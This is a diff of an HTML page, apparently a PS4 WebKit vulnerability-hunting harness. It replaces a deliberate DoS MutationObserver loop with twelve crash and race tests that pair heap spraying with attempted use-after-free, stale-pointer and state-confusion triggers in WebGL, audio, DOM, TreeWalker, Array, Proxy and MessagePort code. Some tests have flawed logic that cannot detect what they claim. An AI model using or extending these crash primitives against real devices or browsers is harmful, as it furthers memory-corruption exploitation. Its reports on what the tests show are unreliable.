@@ -1,111 +1,341 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>PS4 WebKit – Test 165 UNSAFE v2 (repaint-first)</title>
+<meta charset="UTF-8">
+<title>PS4 Hunter V43 (Raw Core)</title>
 </head>
 <body>
-  <h1>PS4 WebKit – Teste 165 (UNSAFE v2 com repaint-first)</h1>
-  <p>Se congelar e não aparecer log, ainda assim o title deve mudar para "ARMED" antes do freeze.</p>
 
-  <button onclick="clearLog()">Limpar log</button>
-  <button onclick="unsafeArm()">Rodar UNSAFE v2</button>
-  <button onclick="stop()">Parar (best-effort)</button>
+<h1>PS4 HUNTER V43 (RAW CORE)</h1>
+<p>3x Memory Crash | 3x Logic/Race</p>
 
-  <hr>
-  <pre id="log" style="white-space:pre-wrap; font-family:monospace;"></pre>
+<hr>
+<h3>CRASH VECTORS (Memory Corruption)</h3>
+<button onclick="runtest1()">TEST 1: ScriptProcessorNode Auditiva UAF</button>
+<button onclick="runtest2()">TEST 2: WebGL Program Use-After-Free</button>
+<button onclick="runtest3()">TEST 3: DOM Node Removal during InsertBefore</button>
+<button onclick="runtest4()">TEST 4: Array.sort() Length Confusion (Silent)</button>
+<button onclick="runtest5()">TEST 5: MessagePort Transfer Closure Race (Race)</button>
+<button onclick="runtest6()">TEST 6: RegExp Sticky State Desync (State)</button>
+<button onclick="runtest7()">TEST 7: TreeWalker Filter Detach (UAF)</button>
+<button onclick="runtest8()">TEST 8: WebGL Deleted Buffer Attribute (Stale Pointer)</button>
+<button onclick="runtest9()">TEST 9: CustomElement Document.write Recursion</button>
+<button onclick="runtest10()">TEST 10: Array.reverse() Getter Side-Effect (Silent)</button>
+<button onclick="runtest11()">TEST 11: Promise.race() Thenable State Confusion (Race)</button>
+<button onclick="runtest12()">TEST 12: Proxy 'getPrototypeOf' Invariant Sabotage (State)</button>
+
+<hr>
+<div id="log" style="border:1px solid #000; padding:10px; font-family:monospace;">Waiting...</div>
 
 <script>
-"use strict";
+    var logDiv = document.getElementById('log');
 
-const L = document.getElementById("log");
-function log(s){ L.textContent += s + "\n"; }
-function clearLog(){ L.textContent = ""; }
-
-let running=false, obs=null, pi=null;
-let ticks=0;
-
-function stop(){
-  log("------------------------------------------------------------");
-  log("[STOP] solicitado (best-effort)");
-  try { if (obs) obs.disconnect(); } catch(e) {}
-  obs=null;
-  try { if (pi) pi.remove(); } catch(e) {}
-  pi=null;
-  running=false;
-  document.title = "STOPPED";
-  log("[STOP] concluído");
-}
-
-// IMPORTANT: só arma aqui. payload pesado só começa depois de 2 frames.
-function unsafeArm(){
-  if (running) return;
-  running=true;
-
-  // Sinalização antes do payload (tenta aparecer antes do freeze)
-  document.title = "ARMED";
-  log("------------------------------------------------------------");
-  log("[165 UNSAFE v2] ARMED (se você ver isto, houve repaint antes do payload)");
-  log("[165 UNSAFE v2] Iniciando em 2 frames…");
-
-  // Double rAF: maximiza chance de repaint
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      // Pequeno atraso extra para UI/paint
-      setTimeout(() => {
-        unsafeStart();
-      }, 50);
-    });
-  });
-}
-
-function unsafeStart(){
-  // Se já travou antes daqui, você não verá isso. Se aparecer, ótimo.
-  document.title = "RUNNING";
-  log("[165 UNSAFE v2] START (payload) @ " + new Date().toISOString());
-
-  try {
-    ticks = 0;
-
-    // 1) Criar PI e anexar
-    pi = document.createProcessingInstruction("xml","test");
-    document.body.appendChild(pi);
-    log("[165] PI anexado.");
-
-    // 2) Observer (UNSAFE): sem budget
-    obs = new MutationObserver(() => {
-      ticks++;
-
-      // Ação explosiva
-      try { pi.remove(); } catch(e) {}
-      try { document.body.appendChild(pi); } catch(e) {}
-      try { pi.remove(); } catch(e) {}
-
-      // log mínimo (se conseguir)
-      if ((ticks % 500) === 0) {
-        document.title = "ticks=" + ticks; // title costuma refletir mais cedo que DOM
-        log("[165] tick=" + ticks);
-      }
-    });
-
-    obs.observe(document.body, { childList:true, subtree:true });
-    log("[165] Observer ativo.");
-
-    // 3) Seed moderado (se congela “instantâneo”, nem isso precisa ser grande)
-    for (let i=0;i<200;i++){
-      const d = document.createElement("div");
-      d.textContent = "x";
-      document.body.appendChild(d);
-      d.remove();
+    function log(msg, type) {
+        // Unifiquei os tipos para garantir que 'ok' também fique verde se usado
+        var isSuccess = (type === 'success' || type === 'ok');
+        var color = type === 'alert' ? 'red' : (isSuccess ? 'green' : 'black');
+        var prefix = type === 'alert' ? '?? [ALERTA]: ' : (isSuccess ? '? [OK]: ' : '>> ');
+        logDiv.innerHTML += '<div style="color:' + color + ';">' + prefix + msg + '</div>';
     }
-    log("[165] Seed concluído.");
 
-    log("[165 UNSAFE v2] Rodando… (se der OOM/freeze, é DoS)");
-  } catch(e) {
-    log("[165] EXCEPTION: " + (e && e.message ? e.message : e));
-    stop();
-  }
-}
+    function sprayHeap() {
+        try {
+            var s = [];
+            for (var i = 0; i < 2000; i++) {
+                s.push(new Uint8Array(1024).fill(0x41));
+            }
+        } catch (e) {}
+    }
+
+    // --- 1. CRASH: ScriptProcessorNode UAF ---
+    function runtest1() {
+        log("Iniciando Crash 1: Audio UAF...");
+        try {
+            var ctx = new (window.AudioContext || window.webkitAudioContext)();
+            var sp = ctx.createScriptProcessor(4096, 1, 1);
+            
+            sp.onaudioprocess = function(e) {
+                sp.disconnect();
+                sp.onaudioprocess = null;
+                sp = null;
+                ctx.close(); 
+                ctx = null;
+                sprayHeap(); 
+                
+                var buf = e.inputBuffer.getChannelData(0);
+                buf[0] = 0xFF; 
+            };
+            
+            sp.connect(ctx.destination);
+            log("Audio process iniciado.");
+        } catch(e) { log("Erro: " + e.message); }
+    }
+
+    // --- 2. CRASH: WebGL Program Use-After-Free ---
+    function runtest2() {
+        log("Iniciando Crash 2: WebGL UAF...");
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl');
+        if(!gl) return log("WebGL off");
+
+        var p = gl.createProgram();
+        var v = gl.createShader(gl.VERTEX_SHADER);
+        gl.shaderSource(v, "void main(){gl_Position=vec4(0,0,0,1);}");
+        gl.compileShader(v);
+        gl.attachShader(p, v);
+        gl.linkProgram(p);
+        gl.useProgram(p);
+
+        gl.deleteProgram(p);
+        gl.deleteShader(v);
+        sprayHeap();
+
+        try {
+            gl.drawArrays(gl.POINTS, 0, 1);
+            log("WebGL sobreviveu (Safe).", "success");
+        } catch(e) { log("Erro: " + e); }
+    }
+
+    // --- 3. CRASH: DOM Node Removal during InsertBefore ---
+    function runtest3() {
+        log("Iniciando Crash 3: DOM Insert UAF...");
+        var parent = document.createElement('div');
+        var ref = document.createElement('div');
+        var node = document.createElement('div');
+        parent.appendChild(ref);
+        
+        node.addEventListener('DOMNodeInserted', function() {
+            log("Evento disparado. Removendo referência...");
+            parent.removeChild(ref);
+            ref = null;
+            sprayHeap();
+        });
+
+        try {
+            parent.insertBefore(node, ref);
+            log("DOM Insert finalizado.");
+        } catch(e) { log("Erro: " + e); }
+    }
+
+    // --- 4. SILENT: Array.sort() Length Confusion ---
+    // CORREÇÃO: Adicionado () após runtest4
+    function runtest4() {
+        log("Iniciando Silent 4: Array Sort...");
+        var arr = [1, 2, 3, 4, 5];
+        var leaked = false;
+        
+        arr.sort(function(a, b) {
+            if (arr.length === 5) {
+                arr.length = 1;
+                sprayHeap();
+            }
+            if (a === undefined || b === undefined) return 0;
+            
+            if (typeof a === 'number' && a > 10) leaked = true;
+            return a - b;
+        });
+
+        if (leaked || (arr.length === 1 && arr[0] !== 1)) {
+            log("ALERTA: Dados corrompidos detectados no Sort!", "alert");
+        } else {
+            log("Sort comportou-se corretamente.", "success");
+        }
+    }
+
+    // --- 5. RACE: MessagePort Transfer Closure ---
+    function runtest5() {
+        log("Iniciando Race 5: Port Transfer...");
+        var mc = new MessageChannel();
+        var p1 = mc.port1;
+        
+        var trap = {
+            get p() {
+                p1.close();
+                return p1;
+            }
+        };
+
+        try {
+            window.postMessage(trap, '*', [p1]);
+            log("Race disparada (Verifique logs de crash se houver).", "success");
+        } catch(e) {
+            log("Erro Race: " + e);
+        }
+    }
+
+    // --- 6. STATE: RegExp Sticky State Desync ---
+    function runtest6() {
+        log("Iniciando State 6: RegExp Sticky...");
+        var re = /A/y;
+        var str = "A";
+        
+        re.lastIndex = {
+            valueOf: function() {
+                str = "B"; 
+                sprayHeap(); 
+                return 0;
+            }
+        };
+
+        try {
+            var res = re.exec(str); 
+            
+            if (res && res[0] === 'A' && str === 'B') {
+                log("ALERTA: Estado dessincronizado! Match em string antiga.", "alert");
+            } else {
+                log("RegExp seguro.", "success");
+            }
+        } catch(e) { log("Erro: " + e); }
+    }
+
+    // --- 7. CRASH: TreeWalker Filter Detach ---
+    function runtest7() {
+        log("Iniciando Crash 7: TreeWalker...");
+        var root = document.createElement('div');
+        var c1 = document.createElement('div');
+        var c2 = document.createElement('div');
+        root.appendChild(c1);
+        root.appendChild(c2);
+        
+        var tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
+            acceptNode: function(node) {
+                if (node === c1) {
+                    log("Filtro ativo em c1. Removendo nó...");
+                    root.removeChild(c1); 
+                    c1 = null;
+                    sprayHeap(); // CORREÇÃO: spray() -> sprayHeap()
+                    return NodeFilter.FILTER_ACCEPT;
+                }
+                return NodeFilter.FILTER_ACCEPT;
+            }
+        });
+
+        try {
+            tw.nextNode(); 
+            tw.nextNode(); 
+            var res = tw.nextNode(); 
+            log("TreeWalker sobreviveu. Próximo: " + (res ? res.tagName : "null"), "ok");
+        } catch(e) { log("Erro capturado: " + e.message); }
+    }
+
+    // --- 8. CRASH: WebGL Deleted Buffer Attribute ---
+    function runtest8() {
+        log("Iniciando Crash 8: WebGL Buffer...");
+        var c = document.createElement('canvas');
+        var gl = c.getContext('webgl');
+        if(!gl) return log("WebGL off");
+
+        var b = gl.createBuffer();
+        gl.bindBuffer(gl.ARRAY_BUFFER, b);
+        gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(100), gl.STATIC_DRAW);
+        
+        gl.enableVertexAttribArray(0);
+        gl.vertexAttribPointer(0, 1, gl.BYTE, false, 0, 0);
+
+        log("Deletando buffer vinculado...");
+        gl.deleteBuffer(b);
+        sprayHeap(); // CORREÇÃO: spray() -> sprayHeap()
+
+        try {
+            gl.drawArrays(gl.POINTS, 0, 10);
+            log("WebGL Draw Call seguro.", "ok");
+        } catch(e) { log("Erro WebGL: " + e); }
+    }
+
+    // --- 9. CRASH: CustomElement Document.write Recursion ---
+    function runtest9() {
+        log("Iniciando Crash 9: CE Recursion...");
+        
+        class Bomb extends HTMLElement {
+            constructor() {
+                super();
+                log("Construtor rodando. Chamando document.write...");
+                try {
+                    document.write("<b>BOOM</b>");
+                } catch(e) { log("Bloqueio detectado: " + e.message, "ok"); }
+            }
+        }
+        
+        if (!customElements.get('x-bomb')) {
+            customElements.define('x-bomb', Bomb);
+        }
+        
+        var div = document.createElement('div');
+        div.innerHTML = "<x-bomb></x-bomb>";
+    }
+
+    // --- 10. SILENT: Array.reverse() Getter Side-Effect ---
+    function runtest10() {
+        log("Iniciando Silent 10: Array.reverse...");
+        var arr = [1, , 3]; 
+        var target = [1, 2]; 
+        
+        Object.defineProperty(Array.prototype, "1", {
+            get: function() {
+                log("Lendo buraco. Encolhendo array...");
+                arr.length = 0; 
+                sprayHeap(); // CORREÇÃO: spray() -> sprayHeap()
+                return "trap";
+            },
+            configurable: true
+        });
+
+        try {
+            var res = arr.reverse();
+            delete Array.prototype["1"];
+
+            if (res.length > 0 && res[0] === 3) {
+                log("ALERTA: Array fantasma acessado após resize!", "alert");
+            } else {
+                log("Array.reverse seguro.", "ok");
+            }
+        } catch(e) { log(e); }
+    }
+
+    // --- 11. RACE: Promise.race() Thenable State Confusion ---
+    function runtest11() {
+        log("Iniciando Race 11: Promise State...");
+        var resolved = false;
+        
+        var evil = {
+            then: function(resolve, reject) {
+                log("Thenable executando...");
+                resolved = true;
+            }
+        };
+
+        var p2 = new Promise(function(r){ 
+            if(resolved) r("Win"); else r("Lose");
+        });
+
+        Promise.race([evil, p2]).then(function(v) {
+            log("Vencedor: " + v);
+            if(v === "Win") log("ALERTA: Efeito colateral vazou ordem de execução.", "alert");
+            else log("Ordem de microtasks correta.", "ok");
+        });
+    }
+
+    // --- 12. STATE: Proxy 'getPrototypeOf' Invariant Sabotage ---
+    function runtest12() {
+        log("Iniciando State 12: Proxy Invariant...");
+        var target = {};
+        Object.preventExtensions(target); 
+        
+        var p = new Proxy(target, {
+            getPrototypeOf: function() {
+                log("Interceptando getPrototypeOf...");
+                return Array.prototype;
+            }
+        });
+
+        try {
+            var proto = Object.getPrototypeOf(p);
+            log("ALERTA: Invariante de Proxy violada! Protótipo falso retornado.", "alert");
+        } catch(e) {
+            if (e instanceof TypeError) log("Motor aplicou regra de segurança corretamente.", "ok");
+            else log("Erro desconhecido: " + e.message);
+        }
+    }
 </script>
 </body>
 </html>
